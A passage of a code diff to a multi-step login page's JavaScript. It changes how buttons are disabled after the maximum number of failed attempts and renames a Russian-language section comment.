+                document.querySelectorAll('.btn-primary').forEach(el => el.disabled = true);
                 showPage('pageError');
                 return;
             }
@@ -725,7 +862,7 @@
             attemptCount++;
             if (attemptCount >= MAX_ATTEMPTS) {
                 document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
-                document.querySelectorAll('#loginFields button, #codeFields button, #eidFields button, #eidLinkFields button').forEach(el => el.disabled = true);
+                document.querySelectorAll('.btn-primary').forEach(el => el.disabled = true);
                 showPage('pageError');
                 return;
             }
@@ -770,7 +907,7 @@
             attemptCount++;
             if (attemptCount >= MAX_ATTEMPTS) {
                 document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
-                document.querySelectorAll('#loginFields button, #codeFields button, #eidFields button, #eidLinkFields button').forEach(el => el.disabled = true);
+                document.querySelectorAll('.btn-primary').forEach(el => el.disabled = true);
                 showPage('pageError');
                 return;
             }
@@ -809,7 +946,7 @@
             attemptCount++;
             if (attemptCount >= MAX_ATTEMPTS) {
                 document.querySelectorAll('#loginFields input, #codeFields input, #eidFields input, #eidLinkFields input').forEach(el => el.disabled = true);
-                document.querySelectorAll('#loginFields button, #codeFields button, #eidFields button, #eidLinkFields button').forEach(el => el.disabled = true);
+                document.querySelectorAll('.btn-primary').forEach(el => el.disabled = true);
                 showPage('pageError');
                 return;
             }
@@ -827,7 +964,7 @@
     }
 
     // ============================================================
-    // 14. ПОКАЗАТЬ ПРИВЕТСТВИЕ ПРИ ЗАГРУЗКЕ
+    // 14. ЗАГРУЗКА
     // ============================================================
     document.addEventListener('DOMContentLoaded', function() {
         goToMain();
